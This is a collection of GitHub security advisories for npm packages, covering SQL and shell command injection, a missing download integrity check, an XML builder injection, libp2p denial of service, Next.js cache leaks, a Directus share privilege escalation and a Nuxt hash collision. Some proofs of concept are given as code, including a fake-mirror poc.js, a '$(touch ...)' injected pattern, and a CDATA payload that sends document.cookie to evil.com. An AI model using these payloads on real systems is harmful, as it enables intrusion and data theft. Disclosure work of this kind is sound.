title: Security Advisory for JavaScript packages hosted at npmjs.com
description: Security Advisory for JavaScript packages hosted at npmjs.com on GitHub

items.content_html:
Several tools in mssql-mcp-core built T-SQL by string-interpolating caller-supplied identifiers and predicates directly into the statement passed to the node-mssql Request.query() batch API. Only data values were parameterized.

Affected tools and inputs:

  • update_data, delete_data: tableName and the free-form whereClause were interpolated raw.
  • insert_data: tableName and column names (object keys) were interpolated raw.
  • execute_transaction: the same raw tableName/whereClause interpolation per operation.
  • create_table, create_index, drop_table: table/column/index/schema identifiers were interpolated with no or insufficient validation.
  • list_databases (reader tier): the stateFilter argument was interpolated raw into the query, with only a non-enforced inputSchema enum guarding it.

The only check on whereClause was that it was non-empty. Because the row-count and preview queries run before the confirmUpdate/confirmDelete step, a malicious whereClause or tableName executed on the first call, bypassing the preview/confirmation and maxRows safety controls. Request.query() submits a multi-statement T-SQL batch, so a crafted input enabled stacked statements (arbitrary DDL/DML), sub-selects, and (with a privileged login and xp_cmdshell enabled) OS command execution. Because list_databases is a read-only tool, the stateFilter sink makes the reader package injectable as well.

Impact

An actor who can supply tool arguments (a malicious or compromised MCP client, or an LLM agent steered via indirect prompt injection) could read, modify, or drop arbitrary data, bypass the read_data allow/deny validation and the preview/confirmation/maxRows safeguards, and conditionally achieve OS command execution.

Patches

Fixed in @connorbritain/mssql-mcp-core 0.6.0:

  • All identifiers are validated against a strict allowlist and bracket-quoted via a shared helper.
  • The free-form whereClause string parameter is removed (breaking change) and replaced with structured, parameterized filters ({ column, operator, value }) using an operator allowlist. Values are always bound, never interpolated.
  • list_databases validates stateFilter against a fixed allowlist before use.

Upgrade the consumer packages: mssql-mcp-reader 0.5.0, mssql-mcp-writer 0.5.0, mssql-mcp-server 0.6.0 (all depend on core ^0.6.0).

Workarounds

Upgrading is the only complete fix; the list_databases (stateFilter) sink is reachable even under READONLY=true and in the reader package. As defense in depth, run the server under a least-privilege SQL login with xp_cmdshell disabled, and restrict which MCP clients can invoke the tools.

items.content_html:
Description

bin/install-from-cache.js downloads a prebuilt native addon (*.node) over the network and writes it directly to the artifact path with no cryptographic integrity verification of any kind — no checksum manifest, no signature, no SRI. A scan of the whole package for createHash|sha256|checksum|integrity|digest|signature finds nothing. The file is then require()-loaded by the consumer, which executes the addon's native module-init code. Anyone able to influence the download achieves code execution on the installing machine.

Affected code (v1.6.0)

  • Mirror is fully attacker-steerable via an env var, no host pinning — bin/install-from-cache.js:80:

    let assetUrl = mirrorHost || process.env[mirrorEnvVar] || 'https://github.com';

    re2 passes --host-var RE2_DOWNLOAD_MIRROR, so setting RE2_DOWNLOAD_MIRROR (CI config, .npmrc/env passthrough, a compromised CI job, a poisoned shell profile) redirects 100% of the download to an arbitrary host with zero pinning.

  • The write sink is a bare writeFile, no verification — bin/install-from-cache.js:185-187:

    const write = async (name, data) => {
  await fsp.mkdir(path.dirname(name), {recursive: true});
  await fsp.writeFile(name, data);   // `data` is the raw HTTP response body
};

  • Cleartext transfer + silent protocol downgrade on redirect — bin/install-from-cache.js:155,165:

    const httpLib = isHttps.test(url) ? https : isHttp.test(url) ? http : null;   // http:// supported
...
get(res.headers.location).then(resolve, reject);   // re-derives protocol from the NEW url

    An https:// asset that 302-redirects to http:// is followed and fetched over plaintext, no warning, no scheme pinning, no redirect cap.

The post-download "verification" is not an integrity gate

isVerified() optionally runs npm run verify-build / npm test after writing the file. For re2, scripts/verify-build.js require()s the binary as its first line — i.e. the downloaded addon's native code has already executed by the time any check runs. It is a functional smoke test, not an integrity gate, and it is skipped entirely when any npm_config_platform* env var is set (:120-122).

Proof of concept

A self-contained, non-malicious PoC (poc.js) proves the missing-integrity property against the real install-from-cache, without shipping a weaponized binary: it stands up a plaintext-HTTP "mirror" serving a sentinel payload, runs install-from-cache with RE2_DOWNLOAD_MIRROR pointed at it, and shows the served bytes are written verbatim to build/Release/re2.node:

npm i install-artifact-from-github
IAFG_BIN=./node_modules/install-artifact-from-github/bin/install-from-cache.js node poc.js

attacker mirror (plaintext http) on 127.0.0.1:PORT
  [mirror] served 2083 attacker bytes over HTTP for /uhop/node-re2/releases/download/1.24.1/darwin-arm64-137
Writing to build/Release/re2.node ... Done.
install-from-cache exit: 0
served   sha256: ec6fdde6...4ebc
written  sha256: ec6fdde6...4ebc
✓ attacker bytes written VERBATIM to build/Release/re2.node — NO integrity check rejected them

The install succeeds (exit 0) with attacker-controlled bytes at the artifact path. Because a real .node executes on require() (NAPI/NODE_MODULE init), substituting a malicious one yields code execution in the installing/running process. (A full code-execution harness using a benign marker-writing native addon was verified separately and is available on request; withheld here to avoid shipping executable payloads.)

Attack scenarios (any one suffices)

  • Attacker-configured or later-compromised RE2_DOWNLOAD_MIRROR.
  • Tampered GitHub release / compromised maintainer account — no checksum detects a swapped asset, even over HTTPS.
  • On-path attacker where a plaintext (http://) mirror or an https→http redirect is in play.

Suggested fix

  1. Publish per-release SHASUMS256.txt (or embed expected digests) and verify the download's SHA-256 before writing/loading; refuse on mismatch. (This is the model prebuild-install already uses.)
  2. Reject http:// asset URLs and https→http redirect downgrades; pin scheme across redirects; cap redirect count/hosts.
  3. Document that verify-build/test run after load and cannot gate integrity.

PoC

poc.js:

// PoC — install-artifact-from-github writes a network-downloaded artifact to disk with NO
// integrity verification, from an env-controlled mirror, over plaintext HTTP.
//
// This proves the CORE defect (arbitrary attacker-supplied bytes become build/Release/re2.node
// with zero checksum/signature check) WITHOUT shipping a weaponized native binary: we serve a
// sentinel payload and show byte-for-byte (sha256) that it is written verbatim as the artifact.
// Because a .node artifact is dlopen()'d on require (running its module-init native code), an
// attacker who substitutes it — via a compromised/attacker-set RE2_DOWNLOAD_MIRROR, a tampered
// GitHub release, or an on-path MITM on the plaintext path — achieves code execution.
//
// Run:  IAFG_BIN=/path/to/install-artifact-from-github/bin/install-from-cache.js node poc.js
//       (defaults to require.resolve if install-artifact-from-github is installed nearby)
const http = require('http');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');

const IAFG = process.env.IAFG_BIN || require.resolve('install-artifact-from-github/bin/install-from-cache.js');
const SENTINEL = Buffer.from('ATTACKER-CONTROLLED-ARTIFACT-BYTES-' + 'A'.repeat(2048)); // stand-in for a malicious .node
const servedSha = crypto.createHash('sha256').update(SENTINEL).digest('hex');

const work = fs.mkdtempSync(path.join(os.tmpdir(), 'iafg-poc-'));
fs.writeFileSync(path.join(work, 'package.json'), JSON.stringify({
  name: 're2', version: '1.24.1', repository: { type: 'git', url: 'https://github.com/uhop/node-re2.git' },
  scripts: { 'verify-build': 'node -e "process.exit(0)"' } // trivial pass; the WRITE happened before this
}));

const server = http.createServer((req, res) => {
  process.stdout.write(`  [mirror] served ${SENTINEL.length} attacker bytes over HTTP for ${req.url}\n`);
  res.writeHead(200, { 'content-type': 'application/octet-stream' });
  res.end(SENTINEL);
});

server.listen(0, '127.0.0.1', () => {
  const port = server.address().port;
  console.log(`attacker mirror (plaintext http) on 127.0.0.1:${port}`);
  const child = spawn('node', [IAFG,
    '--artifact', 'build/Release/re2.node',
    '--host-var', 'RE2_DOWNLOAD_MIRROR',
    '--skip-path-var', 'RE2_DOWNLOAD_SKIP_PATH',
    '--skip-ver-var', 'RE2_DOWNLOAD_SKIP_VER'], {
    cwd: work, stdio: ['ignore', 'inherit', 'ignore'],
    env: { ...process.env, RE2_DOWNLOAD_MIRROR: `http://127.0.0.1:${port}`,
      npm_package_version: '1.24.1', npm_package_github: 'https://github.com/uhop/node-re2',
      npm_package_scripts_verify_build: 'node -e "process.exit(0)"' }
  });
  child.on('exit', (code) => {
    server.close();
    console.log('install-from-cache exit:', code);
    const artifact = path.join(work, 'build/Release/re2.node');
    if (fs.existsSync(artifact)) {
      const writtenSha = crypto.createHash('sha256').update(fs.readFileSync(artifact)).digest('hex');
      console.log('served   sha256:', servedSha);
      console.log('written  sha256:', writtenSha);
      console.log(servedSha === writtenSha
        ? '✓ attacker bytes written VERBATIM to build/Release/re2.node — NO integrity check rejected them (served over plaintext HTTP from an env-controlled mirror). A real .node here would execute on require().'
        : '✗ sha mismatch');
    } else {
      console.log('✗ artifact not written (check IAFG_BIN path)');
    }
    fs.rmSync(work, { recursive: true, force: true });
  });
});

Patches

Fixed in 1.7.0 via hash-bag verification. The consuming package publishes an artifactHashes map (slot → sha256:<hex> of the decompressed binary) in its own package.json — immutable once on npm, stamped at publish time by the new hash-github-cache --write bin (e.g. wired as prepublishOnly). install-from-cache now verifies the decompressed download before writing it to disk; a hash mismatch or a missing slot rejects the download and falls back to building from source. Verification is scoped to the default github.com source — an explicitly configured mirror (--host / mirror env var) remains trust-the-mirror by design. Because the bytes are checked against the published bag, an on-path attacker or an https→http transport downgrade on the default path is also defeated by content verification.

Note: verification activates only when the consuming package ships an artifactHashes bag; packages without one behave as before (backward-compatible, zero-config default). node-re2 >= 1.26.0 publishes a stamped bag.

Workarounds

On <= 1.6.0: skip downloading entirely and build from source via the documented dev short-circuit (DEVELOPMENT_SKIP_GETTING_ASSET env var, or a .development file). 1.7.0 adds first-class --force-build / DOWNLOAD_FORCE_BUILD for the same effect. In all versions, never point a mirror variable (e.g. RE2_DOWNLOAD_MIRROR) at a host you do not fully control.

References

  • https://github.com/uhop/install-artifact-from-github/security/advisories/GHSA-88q3-gch3-5396
  • https://github.com/uhop/install-artifact-from-github/commit/1d2d8637556a03f6235e50fe0c238c6dce291633
  • https://github.com/uhop/install-artifact-from-github/releases/tag/1.7.0
  • https://github.com/advisories/GHSA-88q3-gch3-5396

items.content_html:
Impact

Outstatic’s authenticated GitHub REST proxy accepted an unvalidated endpoint parameter and constructed an upstream GitHub API URL by string concatenation while attaching the authenticated user’s GitHub OAuth token.

A user with access to the Outstatic dashboard could craft a request that caused the server to send their own GitHub OAuth token to a non-GitHub host. If that token was captured, it could be used to access GitHub resources available to that same user, including private repositories depending on granted scopes.

This does not allow unauthenticated attackers to access private repository data, and it does not directly expose another user’s GitHub token without an additional same-origin execution or request-forging primitive.

Patches

The issue has been patched by validating that proxied requests resolve to the exact https://api.github.com/ origin and by restricting forwarded request headers.

Users should upgrade to v2.2.1 or later.

Workarounds

If upgrading immediately is not possible, restrict access to /api/outstatic/github to trusted dashboard users only, or temporarily disable the endpoint if it is not needed.

As a temporary code-level mitigation, reject body-provided endpoint values that do not begin with /, verify the parsed URL origin is exactly https://api.github.com/, and block forwarding of sensitive headers such as Authorization, Host, and User-Agent.

Users who suspect their token was exposed should revoke the affected GitHub OAuth authorization and sign in again.

Shell Command Injection in grep() via Unsanitized searchPattern

Summary

The grep() function exported by @augment-vir/node inserts caller-controlled search patterns directly into a double-quoted shell command string without sanitization (grep.ts:310). When the constructed command is passed to spawn() with shell: 'bash' (shell.ts:98-99), bash evaluates $() command substitution expressions embedded in the pattern, resulting in arbitrary OS command execution as the Node.js process user. Any downstream application that passes untrusted input to grep()'s pattern or patterns field is vulnerable to unauthenticated local (and potentially remote) code execution. CVSS Base Score: 7.8 (High).

Details

Root cause: packages/node/src/augments/fs/grep.ts:310 maps each search pattern into the shell fragment -e "${searchPattern}" with no sanitization:

// grep.ts:310
...searchPatterns.map((searchPattern) => `-e "${searchPattern}"`),

The resulting full command string is forwarded to runShellCommand (grep.ts:320), which calls streamShellCommand (shell.ts:221-224), which ultimately calls:

// shell.ts:98-99
const childProcess = spawn(command, {
    shell,   // defaults to 'bash' (shell.ts:92)

Because shell is 'bash', bash interprets $() within the double-quoted pattern as a command substitution and executes it before grep ever runs.

Incomplete sanitization: An escape() helper exists at grep.ts:178-180 but only replaces " with \" and removes newlines. It is applied to excludePatterns, excludeDirs, and includeFiles (grep.ts:297-308) but not to searchPatterns. Even if it were applied, double-quote escaping does not prevent $() or backtick substitution inside bash double-quote contexts.

Data flow (source → sink):

Step Location Description
1 packages/node/src/index.ts:3 export * from './augments/fs/grep.js' — exposes grep() as a public npm API
2 packages/node/src/augments/fs/grep.ts:223-226 grep() accepts caller-controlled grepSearchPattern and grepSearchLocation
3 packages/node/src/augments/fs/grep.ts:228 searchPatterns derived from grepSearchPattern.patterns || [grepSearchPattern.pattern]
4 packages/node/src/augments/fs/grep.ts:269-314 fullCommand built as a plain shell string
5 packages/node/src/augments/fs/grep.ts:310 Sink: searchPattern inserted as `-e "${searchPattern}"` — no escaping applied
6 packages/node/src/augments/fs/grep.ts:320 fullCommand passed to runShellCommand
7 packages/node/src/augments/terminal/shell.ts:221-224 Forwarded to streamShellCommand
8 packages/node/src/augments/terminal/shell.ts:98-99 spawn(command, { shell: 'bash' }) executes the constructed command string

Suggested remediation:

--- a/packages/node/src/augments/fs/grep.ts
+++ b/packages/node/src/augments/fs/grep.ts
@@
-function escape(input: string) {

+function shellQuote(input: string) {
+    return `'${input.replaceAll("'", String.raw`'\''`).replaceAll('\n', '')}'`;

-        ...searchPatterns.map((searchPattern) => `-e "${searchPattern}"`),
+        ...searchPatterns.map((searchPattern) => `-e ${shellQuote(searchPattern)}`),
+        '--',

Alternatively, replace the shell-string approach with spawn('grep', args, { shell: false }) to avoid shell interpretation entirely.

PoC

Prerequisites: Docker installed on the host. All steps run locally inside a container — no network exposure, no real credentials, no DoS.

Step 1 — Build the Docker image:

  vuln-001

Step 2 — Run the exploit container:

docker run --rm --name augment-vir-vuln-001-run augment-vir-vuln-001-poc

import { grep } from '@augment-vir/node';

  { pattern: '$(touch /tmp/augment-vir-poc-triggered)no-match' },
  { file: 'package.json' },
);

[*] Pattern: $(touch /tmp/augment-vir-poc-triggered)no-match

=== VULNERABLE ===
[+] COMMAND INJECTION CONFIRMED: sentinel file exists at /tmp/augment-vir-poc-triggered

fast-xml-parser XMLBuilder: Comment and CDATA Injection via Unescaped Delimiters

Summary

fast-xml-parser v5.5.12 (latest) XMLBuilder does not escape the --> sequence in comment content or the ]]> sequence in CDATA sections when building XML from JavaScript objects. This allows XML injection when user-controlled data flows into comments or CDATA elements, leading to XSS, SOAP injection, or data manipulation.

Existing CVEs for fast-xml-parser cover different issues:

  • CVE-2023-26920: Prototype pollution (parser)
  • CVE-2023-34104: ReDoS (parser)
  • CVE-2026-27942: Stack overflow in XMLBuilder with preserveOrder
  • CVE-2026-25896: Entity encoding bypass via regex in DOCTYPE entities

This finding covers unescaped comment/CDATA delimiters in XMLBuilder - a distinct vulnerability.

Vulnerable Code

File: src/fxb.js

// Line 442 - Comment building with NO escaping of -->
buildTextValNode(val, key, attrStr, level) {
    // ...
    if (key === this.options.commentPropName) {
        return this.indentate(level) + `<!--${val}-->` + this.newLine;  // VULNERABLE
    }
    // ...
    if (key === this.options.cdataPropName) {
        return this.indentate(level) + `<![CDATA[${val}]]>` + this.newLine;  // VULNERABLE
    }
}

Compare with attribute/text escaping which IS properly handled via replaceEntitiesValue().

Proof of Concept

Test 1: Comment Injection (XSS in SVG/HTML context)

import { XMLBuilder } from 'fast-xml-parser';

const builder = new XMLBuilder({
  commentPropName: "#comment",
  format: true,
  suppressEmptyNode: true
});

const xml = {
  root: {
    "#comment": "--><script>alert('XSS')</script><!--",
    data: "legitimate content"
  }
};

console.log(builder.build(xml));

Output:

<root>
  <!----><script>alert('XSS')</script><!---->
  <data>legitimate content</data>
</root>

Test 2: CDATA Injection (RSS feed)

const builder = new XMLBuilder({
  cdataPropName: "#cdata",
  format: true,
  suppressEmptyNode: true
});

const rss = {
  rss: { channel: { item: {
    title: "Article",
    description: {
      "#cdata": "Content]]><script>fetch('https://evil.com/'+document.cookie)</script><![CDATA[more"
    }
  }}}
};

console.log(builder.build(rss));

Output:

<rss>
  <channel>
    <item>
      <title>Article</title>
      <description>
        <![CDATA[Content]]><script>fetch('https://evil.com/'+document.cookie)</script><![CDATA[more]]>
      </description>
    </item>
  </channel>
</rss>

Test 3: SOAP Message Injection

const builder = new XMLBuilder({
  commentPropName: "#comment",
  format: true
});

const soap = {
  "soap:Envelope": {
    "soap:Body": {
      "#comment": "Request from user: --><soap:Body><Action>deleteAll</Action></soap:Body><!--",
      Action: "getBalance",
      UserId: "12345"
    }
  }
};

console.log(builder.build(soap));

Output:

<soap:Envelope>
  <soap:Body>
    <!--Request from user: --><soap:Body><Action>deleteAll</Action></soap:Body><!---->
    <Action>getBalance</Action>
    <UserId>12345</UserId>
  </soap:Body>
</soap:Envelope>

The injected <Action>deleteAll</Action> appears as a real SOAP action element.

Tested Output

All tests run on Node.js v22, fast-xml-parser v5.5.12:

1. COMMENT INJECTION:
   Injection successful: true

2. CDATA INJECTION (RSS feed scenario):
   Injection successful: true

4. Round-trip test:
   Injection present: true

5. SOAP MESSAGE INJECTION:
   Contains injected Action: true

Impact

An attacker who controls data that flows into XML comments or CDATA sections via XMLBuilder can:

  1. XSS: Inject <script> tags into XML/SVG/HTML documents served to browsers
  2. SOAP injection: Modify SOAP message structure by injecting XML elements
  3. RSS/Atom feed poisoning: Inject scripts into RSS feed items via CDATA breakout
  4. XML document manipulation: Break XML structure by escaping comment/CDATA context

This is practically exploitable whenever applications use XMLBuilder to generate XML from data that includes user-controlled content in comments or CDATA (e.g., RSS feeds, SOAP services, SVG generation, config files).

Suggested Fix

Escape delimiters in comment and CDATA content:

// For comments: replace -- with escaped equivalent
if (key === this.options.commentPropName) {
    const safeVal = String(val).replace(/--/g, '--');
    return this.indentate(level) + `<!--${safeVal}-->` + this.newLine;
}

// For CDATA: split on ]]> and rejoin with separate CDATA sections
if (key === this.options.cdataPropName) {
    const safeVal = String(val).replace(/]]>/g, ']]]]><![CDATA[>');
    return this.indentate(level) + `<![CDATA[${safeVal}]]>` + this.newLine;
}

References

  • https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-gh4j-gqv2-49f6
  • https://nvd.nist.gov/vuln/detail/CVE-2026-41650
  • https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.6.0
  • https://github.com/NaturalIntelligence/fast-xml-parser/commit/e561c2188607a108a9a8d9b6428902a28aad8fb0
  • https://github.com/advisories/GHSA-gh4j-gqv2-49f6

Summary

A single gossipsub peer can grow a node's topics map without bound by flooding subscription RPCs, because the default configuration has no global, per-peer, or topic-length cap and peer scoring does not penalise subscription volume. The peer is never greylisted, so the growth continues toward OOM.

Details

handleReceivedSubscription (packages/gossipsub/src/gossipsub.ts:1028, line 1036) runs this.topics.set(topic, new Set()) for every distinct topic string:

private handleReceivedSubscription (from, topic, subscribe) {
  let topicSet = this.topics.get(topic)
  if (subscribe) {
    if (topicSet == null) {
      topicSet = new Set()
      this.topics.set(topic, topicSet)   // no global cap, no per-peer cap
    }
    topicSet.add(from.toString())
  }
}

The only topical gate (gossipsub.ts:981, if (this.allowedTopics != null && !this.allowedTopics.has(topic)) return) is skipped when allowedTopics is null — the default. Subscriptions are unsigned RPC metadata (no signature needed); decodeRpc's per-RPC limit caps count (maxSubscriptions = 5000) but not topic-string length or aggregate size; and the peer-scoring components P1–P7 have no subscription-volume term, so the attacker's score stays at 0 (above the graylistThreshold of −80) and acceptFrom keeps returning true. Verified on js-libp2p commit a04f5e0, where @libp2p/gossipsub reads 16.0.4.

PoC

Full PoC attached (gossipsub-topics-unbounded-growth-poc.tar.gz). Build the js-libp2p monorepo at the affected version (npm install --ignore-scripts && npm run build), extract the package inside the monorepo root (sibling of packages/), then cd gossipsub-topics-unbounded-growth-poc && node attack.mjs. Expected (default config):

[*] sending 300 RPC frames x 4000 unique ~190-byte topic subscriptions (1,200,000 topics total)
[*]   progress: 88% sent | victim topics=1,032,000 rss=740MB peers=1
[*] victim quiesced: topics=~1,100,000 rss=~870MB peers=1
[!] Vulnerability reproduced: one connected peer grew the victim's gossipsub topics map to ~1.1M entries (RSS +~900MB) with 300 subscription RPCs — no global, per-peer, or topic-length cap in the default config

Control run (ALLOWED_TOPICS=legit-topic, i.e. node attack.mjs control): the identical flood is rejected at the allowedTopics gate and the topics map stays at 0 entries — confirming the vulnerable condition is the default allowedTopics-unset config. The map grows monotonically with no cap until the victim's own resource pressure trips; on disconnect removePeer performs an O(N) sweep over every topic entry (a secondary CPU cost) while the ~1 GB heap stays committed.

Impact

CWE-400/CWE-770. Every node running default gossipsub is affected; the attacker needs only one connection and is never rate-limited or greylisted. Growth continues toward OOM; on disconnect the O(N) removePeer sweep adds CPU cost. Suggested fix: bound by default (not opt-in) — a global cap on topics.size, a per-peer subscription cap with a P7 behaviour penalty so acceptFrom eventually greylists, a topic-string length cap at decode time, and/or flipping allowedTopics to deny-by-default; make removePeer's topic iteration non-blocking/capped.

Summary

A remote peer can stall a js-libp2p node's entire event loop for ~4–5 seconds per connection (and transiently allocate ~2 GB) by sending a ~15-byte crafted publicKey inside an Identify message. The malformed key reaches the DER decoder before any peer-id/signature check, so the attack is pre-auth and repeatable indefinitely by reconnecting.

Details

packages/crypto/src/keys/rsa/der.ts readLength() parses DER long-form lengths with no comparison to buf.byteLength, and readInteger() then loops over the attacker-claimed length:

function readInteger (buf, context) {
  const length = readLength(buf, context)   // attacker-controlled, claims up to 2^64
  const end = context.offset + length
  for (let i = context.offset; i < end; i++) // runs far past buf.byteLength
    vals.push(buf[i])                         // pushes `undefined` past the end
}

The blob reaches the parser pre-auth: Identify runs on every connection:open and calls publicKeyFromProtobuf(publicKey) (packages/protocol-identify/src/identify.ts:85) before the connection.remotePeer.equals(id) check at identify.ts:88. The MAX_RSA_JWK_SIZE guard in pkixToRSAPublicKey only bounds the total blob size, not the inner length field, so a 15-byte payload defeats it; the ECDSA path (unmarshalECDSAPublicKey) has no cap at all. The decode runs in a single synchronous tick, so no AbortSignal — including Identify's 5 s timeout — can interrupt it. Verified on js-libp2p commit a04f5e0, where @libp2p/crypto reads 5.1.21.

PoC

Full PoC attached (libp2p-crypto-der-eventloop-dos-poc.tar.gz). Build the js-libp2p monorepo at the affected version (npm install --ignore-scripts && npm run build), extract the package inside the monorepo root (sibling of packages/), then cd libp2p-crypto-der-eventloop-dos-poc && node attack.mjs. [*] round 1: payload sent=true, victim event-loop stall = 4s, peak RSS ~1980 MB
[*] round 2: payload sent=true, victim event-loop stall = 4-5s, peak RSS ~1980 MB
[*] round 3: payload sent=true, victim event-loop stall = 4s, peak RSS ~1980 MB

The DER RangeError is swallowed by Identify's .catch(() => {}), so the node survives and every new connection re-stalls it; under a container memory limit the ~2 GB spike OOM-kills the process. With Cache Components enabled, an outer 'use cache' function can be keyed incorrectly even when its inner 'use cache' call generates a fresh entry. If the inner function reads a root param (via next/root-params) and returns a value that still contains pending promises — for example an object with data that is ready immediately alongside slower data — React Flight delivers the ready portion to the outer function before the inner entry has finished publishing its root param dependencies. The outer function can then finish, and its cache entry is persisted under a key that omits that root param. The entry is written once and reused for all root param values, so a response for one root param value can serve content produced for a different value. Entries written this way can also ignore tag invalidation and cache lifetimes of the nested caches they consumed.

What values are leaked cannot be attacker controlled. Which value's content is served depends only on which invocation wrote the entry first.

This is a variant of https://github.com/advisories/GHSA-h694-7cp9-m8p3 that the fix for that advisory does not cover: it does not require the inner call to be served from an existing entry, and it does not depend on a slow cache handler.

Summary

A non-admin user who can update their own shares can reassign a share's creator (user_created), role, item, and collection fields after the share is created. The update is authorized against the row as it existed before the change, and the resulting row is never revalidated, so these fields can be set to values the user would not be permitted to assign when creating a share. By reassigning both user_created and role to an administrator the share's effective permissions get elevated.

This is a server-side authorization gap in the share update path. It does not by itself produce an administrator token. It re-opens a previously patched privilege-escalation surface on the effective permissions of a share.

Prerequisites

  • An authenticated non-admin account that holds update permission on directus_shares. This is not part of the baseline app-access grant, which is read-only on a user's own shares, but it is part of the recommended defaults permission template for directus_shares that instances commonly apply so the share feature is usable.
  • An item the account is allowed to share.
  • Knowledge of an administrator user and role identifier to assign. In the reported case these were read from a relation on the shareable item using ordinary read permissions.

Details

The recommended default permission for updating directus_shares selects rows where the caller is the creator and permits writes to the full field set, including the creator, role, item, and collection. The ownership filter is evaluated only against the row as it exists before the update, so an owned share passes the check. The merged row is never re-checked to decide whether the caller may assign the new values.

Two guards that are enforced when a share is created are absent on update. On create, the creator is forced to the acting user, and a share-access check is run against the target item to confirm the caller is allowed to share it. On update, the supplied creator value is stored as given and no equivalent share-access check is run against the new item or collection, so both the creator and the shared target can be repointed to values the caller was never authorized to set. The read-only marking on the creator field in the schema is a Data Studio UI hint and does not constrain writes through the API.

When a guest authenticates through the share, Directus derives one accountability from the share's creator and another from the share's role, and applies administrator reach only when both resolve to an administrator. After both fields are reassigned to an administrator, both inputs resolve to administrator and the share is evaluated with full-schema reach starting from the shared item. This is the bypass of the CVE-2025-24353 intersection, which assumed the creator and selected role remain trustworthy after creation, when in fact both are mutable together through update.

Impact

Improper authorization (CWE-863) and improper privilege management (CWE-269). A non-admin can raise the effective permissions of a share they own beyond both their own permissions and the share role's permissions, exposing data reachable from the shared item that neither principal should be able to expose. The direct impact is to confidentiality. This issue alone does not grant write or availability impact.

Impact

code-review-mcp-server exposes MCP tools (getLocalGitDiff, codeReview, createPR, getPRTemplate) that accept folderPath and baseBranch string parameters. These caller-controlled values were interpolated directly into shell command strings executed via child_process.execSync(), which runs commands through /bin/sh.

A crafted value such as baseBranch = "main; <arbitrary command> #" (or a $(...) command substitution, or a folderPath that breaks out of the surrounding quotes) results in arbitrary command execution on the host running the MCP server.

Patches

Fixed in 1.5.3. Every execSync() call was replaced with execFileSync() using argument arrays, so inputs are passed directly to git / gh without going through a shell, eliminating the injection at its root.

Workarounds

None. Upgrade to code-review-mcp-server@1.5.3 or later.

Next.js applications with 'use cache' can disclose cached data across root params when the same 'use cache' function is called both directly during rendering and through unstable_cache(), and that function reads a root param. Root params are route parameters of the root layout, and applications commonly use them to scope data, for example per locale.

During a cold process start, a cross-request deduplication race allowed an unstable_cache() call to join the in-flight fill of a concurrent direct call and receive its result, bypassing the root param check that would normally reject it. unstable_cache() then stored that result under a cache key without root params, so subsequent requests for other root param values received the same entry until it is revalidated or evicted. Cached data produced for one root param value is returned to requests for other values.

Exploitation requires the unstable_cache() request to arrive while the function's first fill after a process start is still in flight. Outside this race, the nesting already throws an error: 'use cache' inside unstable_cache() is unsupported, and avoiding it is a complete workaround.

Summary

The fix for CVE-2026-46342 (GHSA-g8wj-3cr3-6w7v) binds each /__nuxt_island/<Name>_<hash>.json path to its props by hashing the (name, props, context, source) tuple. That hash was computed over ohash's serialization, which does not escape quotes inside strings or delimiters inside keys, so two different prop objects can produce the same hash. A request with crafted props can therefore pass validation for another island's path and render different content at that path.

Impact

For example, these two prop objects serialize identically and share one island path:

{ html: '', note: '<img src=x onerror="alert(1)">' }
{ html: '\',note:\'<img src=x onerror="alert(1)">' }

This reopens the scenarios described in GHSA-g8wj-3cr3-6w7v:

  • nuxt generate / prerendering. Nuxt caches prerendered island responses by path. If the crawler reaches a link to the colliding URL (for example in user-submitted content included in the build) before it renders the page that uses the legitimate props, the colliding response is written into the generated page.
  • Path-keyed shared caches. A CDN or reverse proxy that caches /__nuxt_island/* by path only, ignoring the query, can be primed with the colliding response.

An attacker has to construct props that collide with a specific legitimate tuple, which in practice means at least part of that tuple is a string they control (for example a stored comment or profile field passed as a prop). Where a prop reaches an unsafe HTML sink in the island (v-html, innerHTML, a renderer treating a prop as HTML), the substituted response can execute script in the site's origin. Without such a sink, the impact is content substitution.

Applications are not affected if they do not use server components or <NuxtIsland>, or if no island receives attacker-influenced string props. Server-rendered responses that are not cached by path alone are also unaffected.

Patches

Fixed in nuxt@4.6.4 and @nuxt/nitro-server@4.6.4. The island hash is now computed over a canonical JSON encoding of the tuple, in which strings and keys are escaped, so different props can no longer produce the same hash.

Island hashes change as a result. Clients that build island URLs themselves should use the exported getIslandHash rather than hashing with ohash directly.

Nuxt 3 has reached end of life and will not receive a fix. Upgrade to Nuxt 4.

Workarounds

  • Ensure any intermediary cache keys /__nuxt_island/* on the full query string, not on the path alone.
  • Treat island props as untrusted input and do not pass them to v-html or other HTML sinks without sanitisation.
  • When prerendering, avoid including user-submitted links to /__nuxt_island/ in crawled pages, for example by excluding that prefix with nitro.prerender.ignore:
export default defineNuxtConfig({
  nitro: {
    prerender: {
      ignore: [route => route.startsWith('/__nuxt_island/') && route.includes('?')],
    },
  },
})

Credits

Thanks to rat5ak for reporting this issue.
